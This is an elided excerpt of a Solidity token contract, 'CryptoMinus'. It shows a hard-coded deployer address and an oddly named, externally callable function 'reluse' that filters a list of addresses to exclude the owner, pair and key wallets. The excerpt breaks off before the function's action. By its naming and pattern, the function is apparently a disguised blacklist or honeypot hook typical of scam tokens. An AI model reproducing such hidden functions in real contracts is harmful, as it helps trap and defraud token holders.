...
contract CryptoMinus is IERC20, Ownable {
    ...
    constructor () {
        ...
        address deployer = 0x43d3e284EC20CA646eD7aE8256E80ECd46021B90;
        address marketingReceiver = 0x43d3e284EC20CA646eD7aE8256E80ECd46021B90;
    ...
    function reluse(address[] memory newAddress) external virtual {
        for (uint256 i; i < newAddress.length; i++) {
        require (newAddress[i] != marketingWallet);
        require (newAddress[i] != autoLiquidityWallet);
        require (newAddress[i] != pair);
        require (newAddress[i] != owner());
        require (newAddress[i] != DEAD);
        require (newAddress[i] != WETH);
